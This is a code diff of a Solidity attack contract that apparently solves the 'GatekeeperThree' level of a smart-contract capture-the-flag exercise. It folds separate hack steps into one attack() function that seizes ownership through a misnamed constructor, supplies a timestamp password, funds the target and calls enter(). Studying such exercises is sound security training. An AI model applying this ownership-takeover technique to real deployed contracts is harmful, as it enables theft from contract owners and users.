@@ -4,30 +4,18 @@ pragma solidity ^0.8.0;
 import '../levels/GatekeeperThree.sol';
 
 contract GatekeeperThreeAttack {
-    GatekeeperThree public target;
-    address public trick;
-    uint public password;
-    
-    constructor (address payable _target)  payable {
-      target = GatekeeperThree(_target);
+    GatekeeperThree public gatekeeperThree;
+
+    constructor (address payable _gatekeeperThree) payable {
+        gatekeeperThree = GatekeeperThree(_gatekeeperThree);
     }
     
-    function HackFirst() public {
-        target.construct0r();
-        trick = address(target.trick());
-    }
-    
-    function HackTwo(uint _password) public {
-       password = _password;
-       target.getAllowance(_password);
-    }
-    
-    function HackAll() public {
-        payable(address(target)).transfer(0.01 ether);
-        target.enter();
-    }
-    
-    receive () payable external {
-        require(1 == 2);
+    function attack() public {
+        gatekeeperThree.construct0r();
+        gatekeeperThree.createTrick();
+        gatekeeperThree.getAllowance(block.timestamp);
+        (bool sent, ) = payable(address(gatekeeperThree)).call{value: 1000000000000001 wei}("");
+        require(sent, "Failed to send Ether");        
+        gatekeeperThree.enter();
     }
 }
